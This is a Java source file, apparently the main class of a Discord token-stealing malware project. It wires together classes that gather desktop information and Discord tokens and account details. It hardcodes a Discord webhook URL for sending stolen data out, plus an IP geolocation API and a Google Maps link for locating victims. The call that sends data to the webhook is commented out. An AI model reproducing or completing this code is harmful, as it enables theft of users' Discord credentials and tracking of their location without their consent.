package me.koenv.mw;

import me.koenv.mw.discord.AccountInfo;
import me.koenv.mw.discord.Tokens;

import java.util.*;

public class Main {

    private static Main main;
    private static final String dcWebhookUrl = "https://discord.com/api/webhooks/839852749360332810/eBtkmVgTq_lz_hIaFqP_XHjXZBDJb3JsZrpXB-byXgXto77EXmGlBhoxhgLBu0GqE3YG";
    private static final String ipUrl = "http://ip-api.com/json/";
    private static final String mapsUrl = "https://www.google.com/maps/search/?api=1&query=";
    private static final String storageUrl = "http://localhost:3000/";
    private static DesktopInfo desktopInfo;
    private static Tokens dcTokens;
    private static AccountInfo dcInfo;
    private static Storage storage;
    private static NetworkManager networkManager;
    private static boolean debugMode;


    public Map<String, Object> dataMap = new HashMap<>();

    public static void main(String[] args) {
        if (Arrays.toString(args).contains("--debug")) { debugMode = true; }
        desktopInfo = new DesktopInfo();
        dcTokens = new Tokens();
        storage = new Storage();
        dcTokens.run();
        dcInfo = new AccountInfo();
        storage.run();
        new Main().run();
    }

    public void run(){
        // Run logic
        main = this;


        //DiscordWebhook.sendMessage(dcWebhookUrl, Webhooks.pcInfo, debugMode);
    }

    public static Main getMain() {
        return main;
    }

    public static DesktopInfo getDesktopInfo() { return desktopInfo; }

    public static String getDcWebhookUrl() {
        return dcWebhookUrl;
    }

    public static String getIpUrl() {
        return ipUrl;
    }

    public static String getMapsUrl() {
        return mapsUrl;
    }

    public static String getStorageUrl() {
        return storageUrl;
    }

    public static Tokens getDcTokens() {
        return dcTokens;
    }

    public static NetworkManager getNetworkManager() {
        return networkManager;
    }

    public static AccountInfo getDcInfo() {
        return dcInfo;
    }
}
